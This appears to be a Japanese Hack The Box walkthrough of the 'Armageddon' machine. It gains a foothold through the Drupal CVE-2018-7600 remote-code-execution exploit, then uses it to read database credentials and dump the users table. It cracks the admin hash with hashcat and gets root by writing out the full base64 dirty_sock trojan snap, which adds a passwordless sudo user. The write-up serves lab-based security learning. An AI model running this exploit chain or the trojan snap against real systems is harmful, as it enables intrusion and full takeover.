# Armageddon

## Enumerate

nmap を使って開いているポートを列挙します．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ nmap -p$ports -sV 10.10.10.233
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 20:44 JST
Nmap scan report for 10.10.10.233
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
```

結果を見ると，ウェブサイトがあるようなのでブラウザで開きます．

![image-20220111204738793](/home/funa/.config/Typora/typora-user-images/image-20220111204738793.png)

ログインのできるサイトのようですが，何を使っているのか `curl` でレスポンスヘッダーを見てみます．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ curl -I http://10.10.10.233/index.php
HTTP/1.1 200 OK
Date: Tue, 11 Jan 2022 11:49:04 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
Content-Type: text/html; charset=utf-8
```

このサイトは Drupal 7 という CMS を使っていることがわかります．

## Foothold

Drupal 7 を調べると CVE-2018-7600 に RCE の脆弱性があることがわかります．この脆弱性の [exploit code](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py) を試してみます．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233/

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-3drVJJEGHpzC_twCh1uqcun9A-ZQkPBRu46rg94P9Z0
[*] Triggering exploit to execute: id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

## Lateral Movement

コードが機能するようなので，使えそうなユーザ名とパスワードが保存されているファイルを検索します．少し調べると，`/sites/default/settings.php` に Drupal のデータベースで使われているユーザ名とパスワードが保存されているファイルがあることがわかります．[link](https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored)

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c "cat /var/www/html/sites/default/settings.php | grep -e username -e password"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-nZGiHMSMsKO2OdmfWKQzgAkFEG43LCZU9q54meVpH0c
[*] Triggering exploit to execute: cat /var/www/html/sites/default/settings.php | grep -e username -e password

...

      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',

...
```

ファイルからユーザ名とパスワードを手に入れることができました．この認証情報を使ってデータベースの中を確認します．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c "mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-4iqlvE5NJi4t0nLRN9yjjpR0yjDRVt0R7MBV1I7pi6g
[*] Triggering exploit to execute: mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema
```

`drupal` というデータベースを詳しく調べます．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c "mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-0HGbaIFzEPjrdg3CjJ9ajFR2fwdZFFyawUpHcGicsKo
[*] Triggering exploit to execute: mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'
Tables_in_drupal

...

users
users_roles
variable
watchdog
```

`users` というテーブルに認証情報がありそうです．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c "mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-9wYHJiJefpBxtGmLqjkMXh4PIbT2vNHqlveLCKbkWG8
[*] Triggering exploit to execute: mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone      language        picture init    data
0                                               NULL    0       0       0       0       NULL            0            NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu          filtered_html    1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu   a:1:{s:7:"overlay";i:1;}
```

`brucetherealadmin` というユーザ名と暗号化されたパスワードを見つけることができました．

`hashcat` を使って暗号化されたパスワードをクラックします．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash

┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ cat hash
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ hashcat -h | grep Drupal
   7900 | Drupal7                                          | Forums, CMS, E-Commerce

┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ hashcat -a 0 -m 7900 hash /usr/share/wordlists/rockyou.txt

...

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

...
```

パスワードの平文が `booboo` だと判明したので，SSH クライアントに接続します．

```bash
┌──(funa㉿kali)-[~/l3ickey/htb/Armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password:
Last login: Tue Jan 11 12:11:52 2022 from 10.10.14.30
[brucetherealadmin@armageddon ~]$ whoami
brucetherealadmin
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

```bash
[brucetherealadmin@armageddon ~]$ pwd
/home/brucetherealadmin
[brucetherealadmin@armageddon ~]$ ls
dirty_sockv2.py  scr.snap  user.txt
```

user flag を見つけました！

## Privilege Escalation

`brucetherealadmin` ユーザが root 権限で実行できるコマンドを調べます．

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
既定値のエントリと照合中 (ユーザー名 brucetherealadmin) (ホスト名 armageddon):
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

ユーザー brucetherealadmin は armageddon 上で コマンドを実行できます
    (root) NOPASSWD: /usr/bin/snap install *
```

`/usr/bin/snap install *` をパスワード無しの root 権限で実行できるようです．`snap` に関する権限昇格を調べると dirty sock の情報が見つかるので使えるか試してみます．[link](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)

pythonコードを実行しても上手くいかなかったため，対話形式で snap ファイルを作成することにします．

```python
[brucetherealadmin@armageddon ~]$ python3
Python 3.6.8 (default, Nov 16 2020, 16:55:22)
[GCC 4.8.5 20150623 (Red Hat 4.8.5-44)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> TROJAN_SNAP = ('''
... aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
... /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
... ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
... TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
... T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
... Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
... ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
... ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
... L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
... b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
... rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
... rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
... AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
... XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
... RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
... AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
...                + 'A' * 4256 + '==')
>>> import base64
>>> blob = base64.b64decode(TROJAN_SNAP)
>>> f = open("scr.snap", "wb")
>>> f.write(blob)
4096
>>> f.close()
>>>
```

作成した snap ファイルをインストールします．

```bash
[brucetherealadmin@armageddon ~]$ ls
scr.snap  user.txt
[brucetherealadmin@armageddon ~]$ sudo snap install --devmode ./scr.snap
dirty-sock 0.1 installed
```

`/etc/passwd` を確認すると，`dirty_sock` というユーザが作成されていることがわかります．

```bash
[brucetherealadmin@armageddon ~]$ cat /etc/passwd

...

brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
```

`su` コマンドを使用して `dirty_sock` ユーザに切り替え，`sudo su` コマンドで管理者権限を手に入れます．

```bash
[brucetherealadmin@armageddon ~]$ su dirty_sock
パスワード:
[dirty_sock@armageddon brucetherealadmin]$ ls
ls: ディレクトリ . を開くことが出来ません: 許可がありません
[dirty_sock@armageddon brucetherealadmin]$ sudo su

あなたはシステム管理者から通常の講習を受けたはずです。
これは通常、以下の3点に要約されます:

    #1) 他人のプライバシーを尊重すること。
    #2) タイプする前に考えること。
    #3) 大いなる力には大いなる責任が伴うこと。

[sudo] dirty_sock のパスワード:
[root@armageddon brucetherealadmin]# ls
scr.snap  user.txt
```

root flag を見つけることができました．

```bash
[root@armageddon brucetherealadmin]# cd /root/
[root@armageddon ~]# ls
anaconda-ks.cfg  cleanup.sh  passwd  reset.sh  root.txt  snap
```

Congratulations! 